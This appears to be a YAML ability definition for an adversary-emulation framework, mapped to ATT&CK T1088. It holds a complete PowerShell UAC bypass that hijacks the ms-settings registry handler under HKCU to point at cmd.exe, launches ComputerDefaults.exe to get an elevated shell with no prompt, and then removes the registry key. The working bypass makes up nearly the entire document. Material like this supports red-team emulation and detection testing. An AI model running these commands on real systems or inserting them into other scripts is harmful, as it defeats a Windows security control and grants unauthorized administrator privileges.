---

- id: tacmulti-1088-AR04-1v00-200121075649
  name: Bypass UAC using ComputerDefaults - PowerShell
  description: .      PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10.  
  tactic: multiple
  technique:
    attack_id: T1088
    name: Bypass User Account Control
  platforms:
    windows:
      psh:
        command: |
          New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
          New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
          Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe" -Force
          Start-Process "C:\Windows\System32\ComputerDefaults.exe"
        cleanup: |
          Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse
